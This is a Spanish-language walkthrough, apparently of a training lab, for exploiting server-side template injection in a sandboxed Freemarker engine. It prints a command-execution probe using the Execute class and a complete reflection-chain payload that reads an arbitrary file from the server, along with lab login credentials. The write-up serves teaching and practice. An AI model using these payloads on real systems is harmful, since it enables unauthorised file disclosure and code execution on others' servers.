# 6. SSTI en Entorno con Sandbox

## 💉 SSTI en entorno con sandbox (Freemarker bypass)

### 📄 Descripción del laboratorio

La aplicación permite a usuarios con rol **content-manager** editar la plantilla de visualización de productos.

El motor de plantillas utilizado es **Freemarker**, pero con un **sandbox activado** que bloquea el acceso directo a clases y métodos peligrosos de Java como:

* `Runtime`
* `Execute`
* `File`
* `ProcessBuilder`

A primera vista, esto parece mitigar el impacto de una vulnerabilidad **SSTI**. Sin embargo, el sandbox está mal implementado y deja expuestas rutas indirectas mediante **reflexión**, lo que permite leer archivos arbitrarios del sistema.

El objetivo es:

* Explotar **SSTI en Freemarker con sandbox activo**.
* Bypassear las restricciones del sandbox.
* Leer el archivo:

```
/home/carlos/my_password.txt
```

* Enviar su contenido como solución del laboratorio.

***

### 📚 Teoría

Freemarker permite evaluar expresiones Java utilizando la sintaxis:

```java
${ ... }
```

Cuando se activa el **sandbox**, se restringe explícitamente el acceso a métodos peligrosos. Sin embargo, no se bloquea completamente la **reflexión sobre objetos del contexto**.

#### 📌 El fallo clave

El sandbox:

* Bloquea `Runtime.exec()`, `Execute` y `File`.
* Bloquea llamadas directas a clases críticas.
* Permite navegar por **métodos estándar de Java** como `getClass()` o `getProtectionDomain()`.

Esto permite construir una cadena de llamadas legítimas que:

* No ejecuta comandos.
* No usa clases bloqueadas.
* Permite acceder a archivos del sistema.

#### 📌 Cadena de bypass utilizada

El bypass se basa en la siguiente secuencia de llamadas:

```
Objeto del contexto (product)
 → getClass()
 → getProtectionDomain()
 → getCodeSource()
 → getLocation()
 → toURI()
 → resolve('/home/carlos/my_password.txt')
 → toURL()
 → openStream()
 → readAllBytes()
```

Esto devuelve el contenido del archivo como **array de bytes**.

Freemarker no puede mostrar directamente bytes, por lo que se utiliza:

```
?join(" ")
```

para convertirlos en una cadena de valores **ASCII decimales separados por espacios**.

***

### 📝 Práctica

#### 🎯 Objetivo

Leer el contenido del archivo:

```
/home/carlos/my_password.txt
```

***

#### 1️⃣ Acceso como content-manager

Se inicia sesión con las credenciales:

```
content-manager:C0nt3ntM4n4g3r
```

***

#### 2️⃣ Confirmación de SSTI

Se prueba una expresión básica:

```java
${7*7}
```

<figure><img src="../../../.gitbook/assets/image (442).png" alt=""><figcaption></figcaption></figure>

Resultado:

```
49
```

Esto confirma que:

* El motor utilizado es **Freemarker**.
* El contenido se evalúa como una **plantilla real**.

***

#### 3️⃣ Verificación del sandbox

Se prueban payloads clásicos de ejecución de comandos:

```java
${"freemarker.template.utility.Execute"?new()("id")}
```

Resultado:

Aparece un error indicando que el método **no está permitido en el sandbox**.

Esto confirma que el sandbox bloquea la **ejecución directa de comandos**.

***

#### 4️⃣ Bypass del sandbox para lectura de archivos

Se utiliza el siguiente payload para acceder al archivo objetivo:

```java
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

Se introduce en la plantilla (por ejemplo, en la descripción del producto), se guarda y se carga la vista.

<figure><img src="../../../.gitbook/assets/image (443).png" alt=""><figcaption></figcaption></figure>

***

#### 5️⃣ Decodificación del contenido

La respuesta muestra una secuencia similar a:

```
109 121 95 112 97 115 115 119 111 114 100
```

Estos valores corresponden a **ASCII decimal**.

Se pueden convertir utilizando herramientas como:

* **CyberChef**
* Conversores **decimal → texto**

Configuración en CyberChef:

* Operation: **From Decimal**
* Separator: **espacio**
